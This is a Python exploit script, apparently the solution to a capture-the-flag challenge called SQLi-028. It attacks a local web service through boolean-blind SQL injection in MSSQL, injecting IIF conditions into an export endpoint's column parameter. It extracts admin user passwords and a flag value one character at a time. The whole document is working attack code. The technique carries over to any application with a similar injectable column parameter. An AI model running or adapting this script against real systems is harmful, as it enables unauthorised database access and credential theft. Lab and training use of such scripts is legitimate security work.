#!/usr/bin/env python3
"""SQLi-028: MSSQL Boolean Blind via Dynamic Column Exploit"""
import requests
import string

BASE_URL = "http://localhost:5028"
CHARSET = string.ascii_letters + string.digits + "_{}"

def check(condition):
    url = f"{BASE_URL}/export?column=IIF(({condition}),report_name,status)"
    r = requests.get(url, timeout=10)
    # Report names are unique, status values are 'published'/'draft'
    return "Q1 Sales" in r.text or "Q2 Marketing" in r.text

def extract(table, column, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            cond = f"(SELECT SUBSTRING({column},{pos},1) FROM {table})='{c}'"
            if check(cond):
                result += c
                print(f"[+] {column}: {result}")
                found = True
                break
        if not found:
            break
    return result

def main():
    print("SQLi-028: MSSQL Dynamic Column Blind Exploit")
    print("=" * 45)
    extract("admin_users", "password")
    flag = extract("flags", "value")
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
